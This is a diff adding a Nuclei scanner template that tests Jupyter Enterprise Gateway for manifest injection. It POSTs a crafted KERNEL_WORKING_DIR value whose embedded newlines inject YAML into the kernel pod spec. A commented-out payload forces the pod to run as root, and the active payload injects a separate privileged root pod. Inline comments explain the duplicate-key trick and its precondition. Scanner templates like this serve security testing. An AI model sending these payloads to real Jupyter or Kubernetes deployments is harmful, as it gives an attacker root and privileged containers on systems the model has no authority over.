@@ -1,0 +1,41 @@
+id: jupyter-enterprise-gateway-manifest-injection
+info:
+  name: Jupyter Enterprise Gateway Manifest Injection
+  author: berney
+  severity: info
+
+http:
+  - id: manifest-injection
+    method: POST
+    path:
+      - "{{BaseURL}}/api/kernels"
+    # Requires mirrorWorkingDirs to be enabled in the Helm chart for KERNEL_WORKING_DIR to be injectable.
+    # Injects a duplicate securityContext block via embedded newlines in KERNEL_WORKING_DIR.
+    # YAML duplicate key semantics mean the last value wins, causing the kernel pod to run as root (UID/GID 0).
+    #body: |
+    #  {
+    #    "env": {
+    #      "KERNEL_POD_NAME": "nuclei-manifest-injection",
+    #      "KERNEL_NAMESPACE": "notebooks",
+    #      "KERNEL_WORKING_DIR": "\"/tmp\\\"\\n\\n# INJECTION\\n  securityContext:\\n    runAsUser: 0\\n    runAsGroup: 0\\n    fsGroup: 100\\n# stray quote \""
+    #    }
+    #  }
+    # Alternative payload - inject a pod
+    body: |
+      {
+        "env": {
+          "KERNEL_POD_NAME": "nuclei-manifest-injection",
+          "KERNEL_NAMESPACE": "notebooks",
+          "KERNEL_WORKING_DIR": "\"/tmp\\\"\\n\\n# INJECTION\\n...\\n---\\napiVersion: v1\\nkind: Pod\\nmetadata:\\n  name: injected-pod\\n\\\n  spec:\\n  containers:\\n    - name: injected-container\\n      image: nginx\\n      ports:\\n        - containerPort: 80\\n      securityContext:\\n        privileged: true\\n        runAsUser: 0\\n        runAsGroup: 0\\n...\\n# HAHA - stray quote\""
+        }
+      }
+    matchers:
+      - type: status
+        status:
+          - 201
+    extractors:
+      - type: json
+        part: body
+        name: id
+        json:
+          - .id
